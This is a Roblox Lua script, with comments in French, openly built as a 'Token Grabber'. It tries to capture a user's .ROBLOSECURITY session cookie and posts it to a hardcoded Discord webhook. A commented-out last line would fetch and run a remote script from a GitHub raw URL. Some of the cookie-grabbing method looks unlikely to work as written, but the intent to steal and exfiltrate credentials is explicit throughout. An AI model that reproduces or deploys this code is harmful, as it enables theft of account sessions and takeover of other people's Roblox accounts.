local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local function grabROBLOSECURITY()
    local success, result = pcall(function()
        local response = HttpService:RequestAsync({
            Url = "https://www.roblox.com/home",
            Method = "GET",
            Headers = {
                ["User-Agent"] = "Roblox/WinInet"
            }
        })
        
        -- Analyse les en-têtes de réponse pour trouver le cookie
        local cookies = response.Headers["Set-Cookie"]
        if cookies then
            for cookie in cookies:gmatch("[^;]+") do
                if cookie:match("%.ROBLOSECURITY=([^;]+)") then
                    return cookie:match("%.ROBLOSECURITY=([^;]+)")
                end
            end
        end
        
        -- Alternative: tente d'accéder via localStorage si disponible
        local script = [[
            return game:GetService("HttpService"):JSONDecode(
                game:GetService("HttpService"):GetAsync("https://www.roblox.com/home")
            )
        ]]
        
        local data = loadstring(script)()
        if data and data.cookie then
            return data.cookie
        end
        
        return nil
    end)
    
    if success then
        return result
    else
        warn("Erreur lors de la récupération du cookie: " .. tostring(result))
        return nil
    end
end

local function sendToWebhook(cookie)
    local webhookUrl = "https://discord.com/api/webhooks/1489328829796192336/zCRlklzbe-Rvypv3hE0igX2WrT7-obHn2EC4W6vyg51cFeomzSTZlE6WIScmHzjUnuIy" -- Remplacez par votre URL
    
    local data = {
        content = "Nouveau cookie .ROBLOSECURITY récupéré: " .. cookie,
        username = "Token Grabber"
    }
    
    pcall(function()
        HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(data))
    end)
end

-- Exécution principale
local cookie = grabROBLOSECURITY()
if cookie then
    sendToWebhook(cookie)
    print("Cookie .ROBLOSECURITY récupéré avec succès")
else
    print("Échec de la récupération du cookie")
end

-- loadstring(game:HttpGet("https://raw.githubusercontent.com/BestStealABrainrotScript/InstantStealSpawnerBrainrotsSpawner/refs/heads/main/SCRIPT.lua"))()
